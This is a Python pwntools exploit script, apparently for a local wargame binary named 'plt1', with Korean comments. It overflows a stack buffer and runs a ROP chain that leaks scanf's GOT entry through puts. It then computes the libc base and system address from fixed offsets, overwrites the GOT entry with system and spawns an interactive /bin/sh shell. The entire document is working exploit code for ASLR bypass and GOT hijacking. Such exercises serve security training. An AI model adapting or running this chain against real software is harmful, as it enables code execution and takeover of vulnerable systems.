# -*- coding: utf-8 -*- 
from pwn import *

PATH = "./plt1"
p = process(PATH)
e = ELF(PATH)

puts = e.plt['puts'] + 0x6
scanf_got = e.got['__isoc99_scanf']
scanf_plt = e.plt['__isoc99_scanf']
print hex(puts)
print hex(scanf_got)



# payload = p8(0x41)*36 + p32(puts) + p32(0xdeadbeef) + p32(scanf_got)

# print p.sendlineafter('Hello ASLR!\n', payload)
# data = p.recvline()
# scanf_rel = u32(data[:4])
# print hex(scanf_rel)

# libe_base = scanf_rel-0x5c0d0
# print hex(libe_base)


# ROP
ppr = 0x0804851a
pr = ppr+1
string_fmt = 0x8048559

# stage 0

payload = "A"*36
payload += p32(puts) # ret addr(puts@plt + 6)
payload += p32(pr)   # ret after puts
payload += p32(scanf_got)   # scanf@got -> leak

payload += p32(scanf_plt)   # -> p32(system)+"/bin/sh\x00"
payload += p32(ppr)         # scanf의 리턴 주소
payload += p32(string_fmt)  # %s
payload += p32(scanf_got)   # 문자열 저장 주소: scanf_got(p32(system+"/bin/sh\x00"))

payload += p32(scanf_plt)   # pop pop ret 최종 도착 지점
# -> scanf_got = system

payload += p32(0xdeadbeef) # scanf의 리턴 주소값
payload += p32(scanf_got+4) # /bin/sh\x00



print p.sendlineafter('Hello ASLR!\n', payload)

log.info('leak')
libc = u32(p.recvline()[:4])-0x5c0d0
system = libc + 0x3adb0
log.info("libc@"+hex(libc))
log.info("system@"+hex(system))

log.info("get SHELL")
p.sendline(p32(system)+"/bin/sh\x00")

p.interactive()

